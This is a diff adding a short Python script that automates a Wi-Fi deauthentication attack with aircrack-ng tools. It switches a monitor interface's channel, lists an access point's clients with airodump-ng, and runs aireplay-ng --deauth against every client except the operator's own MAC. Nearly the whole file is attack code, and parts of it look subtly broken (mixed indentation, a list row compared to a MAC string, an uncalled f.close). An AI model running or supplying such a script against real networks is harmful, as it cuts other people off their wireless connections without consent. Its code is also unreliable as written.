@@ -1,0 +1,60 @@
+import string
+import os
+import threading
+import time
+import re
+
+
+#TODO : 
+#  ADD COMMAND ARGS (interface ....)
+
+
+
+
+def Change_Channel(Channel):
+  os.system('ifconfig mon0 down')
+  os.system('iwconfig mon0 channel '+Channel)
+  os.system('ifconfig mon0 up')
+
+
+  
+def GetOut(Channel,Current_Channel,BSSID,My_Mac):
+  
+  if(Channel != Current_Channel):
+    Change_Channel(Channel)
+  client_list = ScanClients(BSSID,Channel)
+  for elt in client_list:
+	if(re.sub(' ','',elt) != My_Mac ):
+		C_BSSID = elt[0]
+		os.system('aireplay-ng --deauth 5 mon0 -a %s -c %s' %(BSSID,C_BSSID))
+
+
+## Airdump:
+def AD_Start(bssid,channel):
+  os.system('airodump-ng mon0 --bssid %s -c %s --write stations --output-format csv' %(bssid,channel))
+
+def AD_Kill():
+  os.system('kill -15 $(pidof airodump-ng)')
+
+def ScanClients(bssid,channel):
+#  thread = threading.Thread(target=AD_Start,args=(bssid,channel))
+#  thread.start()
+#  time.sleep(15)
+#  AD_Kill()
+#  thread.join()
+  os.system('((airodump-ng mon0 --bssid %s -c %s --write stations --output-format csv) &) && sleep 10s && kill -15 $(pidof airodump-ng)' %(bssid,channel))
+  f = open('stations-01.csv','r')
+  i = 0
+  while(i<5):
+   line = f.readline()
+   i += 1
+  line = ' '
+  client_info = []
+  while line:
+	line = f.readline()
+	if(len(line)>5):
+	  client_info.append(re.sub('\n','',line).split(','))
+
+  f.close
+  os.remove('stations-01.csv')
+  return client_info
